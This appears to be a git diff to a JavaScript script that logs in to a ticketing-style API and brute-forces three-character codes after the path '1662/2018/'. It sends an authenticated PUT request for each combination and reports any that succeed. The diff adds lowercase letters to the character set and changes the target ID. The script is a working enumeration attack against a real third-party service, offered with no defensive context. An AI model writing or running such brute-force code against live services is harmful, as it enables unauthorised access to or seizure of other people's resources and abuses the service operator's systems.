@@ -4,7 +4,8 @@ const api = axios.create({
     baseURL: "https://api.unticketparabernabeu.com/usuario/"
 });
 
-const options = ["1","2","3","4","5","6","7","8","9","0","A","B","C","D","E","F","G","H","I","J","K","L","M","N","Ñ","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
+const options = ["1","2","3","4","5","6","7","8","9","0","A","B","C","D","E","F","G","H","I","J","K","L","M","N","Ñ","O","P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g","h","i","j","k","l","m","n","ñ","o","p","q","r","s","t","u","v","w","x","y","z"]
+
 
 const login = async (email, clave) => {
     try {
@@ -43,10 +44,11 @@ const main = async () => {
     const token = await getToken();
     let responseResult = '';
     let urlResult = '';
+    
     for (let i = 0; i < options.length; i++) {
         for (let j = 0; j < options.length; j++) {
             for (let k = 0; k < options.length; k++) {
-                const url = `1078/2018/${options[i]}${options[j]}${options[k]}`;
+                const url = `1662/2018/${options[i]}${options[j]}${options[k]}`;
                 const response = await putApi(url, token);
                 if (response) {
                     console.log(`La url ${url} fue exitosa`);
@@ -65,6 +67,11 @@ const main = async () => {
     }
     console.log(responseResult);
     console.log(urlResult);
+    if(!responseResult){
+        console.log("No se encontró ninguna url exitosa")
+    }
 }
+
+
 
 main();
